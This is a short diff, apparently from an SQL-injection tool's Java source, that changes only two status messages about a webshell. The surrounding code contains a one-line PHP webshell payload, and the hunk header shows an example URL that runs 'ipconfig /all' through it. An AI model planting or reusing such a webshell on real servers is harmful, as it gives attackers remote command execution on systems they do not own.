@@ -732,14 +732,14 @@ http://127.0.0.1/test_outfile.php?c=ipconfig+/all
         }
         
         if(urlToWebshell.equals("")){
-            sendMessage("Webshell Url: "+ initialUrl.substring( 0, initialUrl.lastIndexOf('/')+1 )+"test_outfile.php");
+            sendMessage("Using Webshell URL: "+ initialUrl.substring( 0, initialUrl.lastIndexOf('/')+1 )+"test_outfile.php");
             urlToWebshell = initialUrl.substring( 0, initialUrl.lastIndexOf('/')+1 );
         }
         
         ArrayList<String> f = new ArrayList<String>();
         f.add(s.substring( s.lastIndexOf('/'), s.length() ));
         if(StringTool.hexstr(hexResult).indexOf("<SQLi><?php system($_GET['c']); ?><iLQS>") > -1){
-            sendMessage("Webshell folder: "+s);
+            sendMessage("Webshell created in "+s);
             new GUIThread("add-shell", new String[]{s,urlToWebshell}).run();
         }
     }
